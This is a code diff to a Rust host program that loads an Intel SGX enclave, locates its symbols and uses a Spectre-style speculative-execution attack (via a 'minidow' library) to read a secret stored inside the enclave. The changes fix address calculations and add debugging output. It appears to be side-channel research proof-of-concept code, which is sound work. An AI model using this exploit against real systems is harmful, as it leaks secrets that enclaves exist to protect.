@@ -16,7 +16,6 @@
 // under the License..
 
 #![feature(asm)]
-use std::num::Wrapping;
 
 extern crate sgx_types;
 extern crate sgx_urts;
@@ -30,10 +29,12 @@ extern crate capstone;
 use capstone::prelude::*;
 
 extern crate nix;
+//use nix::sched::{sched_setaffinity, CpuSet};
 use nix::sys::mman::{mmap, mprotect, MapFlags, ProtFlags};
+//use nix::unistd::Pid;
 
 extern crate libc;
-use libc::{c_void, exit};
+use libc::c_void;
 
 static ENCLAVE_FILE: &'static str = "enclave1.signed.so";
 
@@ -138,11 +139,11 @@ fn main() -> std::io::Result<()> {
     let mut minidow_secret_sym = goblin::elf::Sym::default();
     let mut secret_sym = goblin::elf::Sym::default();
     let mut spectre_limit_sym = goblin::elf::Sym::default();
-    /*
+
     let mut jb_offset = 0;
     let mut jb_dst_addr = 0;
     let mut ret_offset = 0;
-    */
+
     let mut spectre_test_offset = 0;
     let mut spectre_test_size = 0;
 
@@ -158,10 +159,10 @@ fn main() -> std::io::Result<()> {
             spectre_test_offset = sym.st_value as usize;
             spectre_test_size = sym.st_size as usize;
 
-            /*
             let asm_code =
                 &enclave_binary[spectre_test_offset..spectre_test_offset + spectre_test_size];
 
+            println!("function code: {:?}", asm_code);
             let insns = cs
                 .disasm_all(asm_code, sym.st_value)
                 .expect("Failed to disassemble");
@@ -186,15 +187,12 @@ fn main() -> std::io::Result<()> {
                     break;
                 }
             }
-            */
         }
     }
 
-    /*
     println!("ret_offset: 0x{:x}", ret_offset);
     println!("jb_offset: 0x{:x}", jb_offset);
     println!("jb_dst_addr: 0x{:x}", jb_dst_addr);
-    */
 
     println!("spectre_test_offset: 0x{:x}", spectre_test_offset);
 
@@ -224,8 +222,8 @@ fn main() -> std::io::Result<()> {
         std::mem::transmute(aligned_addr)
     };
 
-    let top_32bit_offset = (secret_full_addr - mapped_array as *const u8 as u64
-        + secret_sym.st_value)
+    let top_32bit_offset = (secret_full_addr
+        - (mapped_array as *const u8 as u64 + secret_sym.st_value))
         & (!((1 << 32) - 1));
     println!("top_32bit_offset: 0x{:x}", top_32bit_offset);
 
@@ -233,23 +231,15 @@ fn main() -> std::io::Result<()> {
 
     let data_offset_file = elf.section_headers[minidow_secret_sym.st_shndx].sh_offset as i64
         - elf.section_headers[minidow_secret_sym.st_shndx].sh_addr as i64;
-    let minidow_secret_array_addr = mapped_array as *const _ as usize
-        + unsafe {
-            *(&enclave_binary[(data_offset_file + minidow_secret_sym.st_value as i64) as usize
-                ..(data_offset_file + minidow_secret_sym.st_value as i64 + 8) as usize]
-                as *const _ as *const usize)
-        };
-
-    let minidow_secret_array_addr_in_enclave =
-        minidow_secret_array_addr as i64 + top_32bit_offset as i64;
-    println!(
-        "Minidow_secret adress inside the enclave: {:x}",
-        minidow_secret_array_addr_in_enclave
-    );
-
+    let minidow_secret_array_rela_addr = unsafe {
+        *(&enclave_binary[(data_offset_file + minidow_secret_sym.st_value as i64) as usize
+            ..(data_offset_file + minidow_secret_sym.st_value as i64 + 8) as usize]
+            as *const _ as *const usize)
+    };
     let spectre_limit_addr = top_32bit_offset as usize
         + mapped_array as *const _ as usize
         + spectre_limit_sym.st_value as usize;
+    println!("spectre_limit_addr: 0x{:x}", spectre_limit_addr);
 
     let spectre_test_training_fun: unsafe extern "C" fn(
         measurement_array_addr: usize,
@@ -275,7 +265,8 @@ fn main() -> std::io::Result<()> {
             secret_sym.st_size as usize,
         );
         for i in 0..128 {
-            *((minidow_secret_array_addr + i) as *mut u8) = b'0';
+            *((minidow_secret_array_rela_addr as usize + mapped_array as *const _ as usize + i)
+                as *mut u8) = b'0';
         }
 
         // I'm not sadistic enough to put the function in RWX memory.
@@ -286,7 +277,7 @@ fn main() -> std::io::Result<()> {
         mprotect(
             // align on a page boundary
             ((dst_addr as usize) & (!((1 << 12) - 1))) as *mut c_void,
-            spectre_test_size,
+            spectre_test_size + ((dst_addr as usize) & ((1 << 12) - 1)),
             ProtFlags::PROT_READ | ProtFlags::PROT_EXEC,
         )
         .unwrap();
@@ -294,29 +285,34 @@ fn main() -> std::io::Result<()> {
         std::mem::transmute(dst_addr)
     };
 
-    // yay, training is now possible!
+    //let mut cpuset = CpuSet::new();
+    //cpuset.set(0).unwrap();
+    //sched_setaffinity(Pid::from_raw(0), &cpuset).unwrap();
+
     setup_measurements();
+    // yay, training is now possible!
 
     unsafe extern "C" fn spectre_test_ecall(base_addr: usize, off: usize) {
         //*((base_addr + minidow::MULTIPLE_OFFSET) as *mut u8) = 123;
-        //asm!(
-        //    "xor rax, rax",
-        //    "mov eax, $2",
-        //    "mov rbx, $0",
-        //    "mov rcx, $0",
-        //    "enclu"
-        //);
         let result = Enclave1_spectre_test(ENCLAVE.geteid(), base_addr as u64, off as u64);
         if result != sgx_status_t::SGX_SUCCESS {
             println!("[-] ECALL Enclave Failed: {}!", result.as_str());
         }
     }
-    /*
-    let target = (Wrapping(secret_sym.st_value as usize)
-        - Wrapping(minidow_secret_array_addr_in_enclave as usize + 64))
-    .0;
-    */
-    let target = minidow_secret_array_addr_in_enclave as usize + 64;
+
+    let minidow_secret_array_addr_in_enclave = minidow_secret_array_rela_addr as i64
+        + mapped_array as *const _ as i64
+        + top_32bit_offset as i64;
+    println!(
+        "Minidow_secret adress inside the enclave: 0x{:x}",
+        minidow_secret_array_addr_in_enclave
+    );
+
+    let target = secret_full_addr as usize;
+    //let target = secret_sym.st_value as usize
+    //    + top_32bit_offset as usize
+    //    + mapped_array as *const _ as usize;
+    //let target = minidow_secret_array_addr_in_enclave as usize + 120;
     println!("target: 0x{:x}", target);
 
     let spectre = Spectre::new(
@@ -325,8 +321,27 @@ fn main() -> std::io::Result<()> {
         Some((minidow_secret_array_addr_in_enclave as usize + 64) as *const i8),
         Some(spectre_limit_addr as *const u8),
     );
-    println!("0x{:x}", minidow::read_ptr(&spectre, || {}, target));
-    println!("{:p}", unsafe { minidow::BASE_ADDR as *const u8 });
+
+    // use a lot of nops to try to make the predictor take longer to detect the misprediction
+    //static mut BRANCH_DST_ADDR: *mut u8 = 0 as *mut u8;
+    //unsafe {
+    //    std::arch::x86_64::_mm_prefetch(target as *const i8, std::arch::x86_64::_MM_HINT_T0);
+    //    BRANCH_DST_ADDR =
+    //        (jb_dst_addr + mapped_array as *const _ as i64 + top_32bit_offset as i64) as *mut u8;
+    //}
+
+    println!(
+        "0x{:x}",
+        minidow::read_ptr(
+            &spectre,
+            || {
+                //unsafe {
+                //    std::arch::x86_64::_mm_clflush(BRANCH_DST_ADDR);
+                //}
+            },
+            target
+        )
+    );
 
     unsafe {
         std::mem::take(&mut ENCLAVE).destroy();
